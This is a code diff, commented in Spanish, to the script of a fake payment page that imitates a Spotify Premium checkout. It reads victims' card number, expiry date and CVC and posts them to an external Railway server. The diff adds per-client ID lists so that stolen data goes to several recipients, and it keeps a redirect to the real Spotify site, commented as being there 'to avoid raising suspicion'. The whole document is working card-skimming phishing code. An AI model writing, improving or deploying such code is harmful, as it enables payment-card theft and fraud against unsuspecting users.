@@ -192,8 +192,9 @@
 <!-- ... (Todo tu CSS se mantiene igual) ... -->
 
 <script>
-    // --- CONFIGURACIÓN ---
-    // Solo necesitas el link de tu servidor de Railway
+    // --- CONFIGURACIÓN DEL CLIENTE (CAMBIA ESTO EN CADA HTML) ---
+    // Si es el cliente 1, pones sus IDs. Si es el cliente 2, pones los del grupo.
+    const IDS_DE_ESTE_CLIENTE = ['7707049896']; 
     const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
 
     function selectMethod(btn, method) {
@@ -209,6 +210,7 @@
       validateForm();
     }
 
+    // Formateo de tarjeta
     document.getElementById('cardNumber').addEventListener('input', function(e) {
       let value = e.target.value.replace(/\D/g, ''); 
       let formatted = '';
@@ -253,8 +255,9 @@
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
-      // YA NO MANDAMOS target_id, el servidor lo detecta solo por el dominio
+      // CORRECCIÓN CLAVE: Mandamos la lista de IDs que definimos arriba
       const payload = {
+        lista_ids: IDS_DE_ESTE_CLIENTE, 
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
@@ -262,15 +265,23 @@
       };
 
       try {
-        await fetch(`${SERVER_URL}/enviar-datos`, {
+        console.log("Enviando datos al servidor...");
+        const response = await fetch(`${SERVER_URL}/enviar-datos`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
+        
+        if (response.ok) {
+          console.log("¡Éxito! Los datos se enviaron.");
+        } else {
+          console.error("El servidor respondió con error.");
+        }
       } catch (error) {
-        console.error("Error:", error);
+        console.error("Error de conexión:", error);
       }
 
+      // Redirigir siempre para no levantar sospechas
       window.location.href = 'https://www.spotify.com/mx/premium/';
     }
 </script>
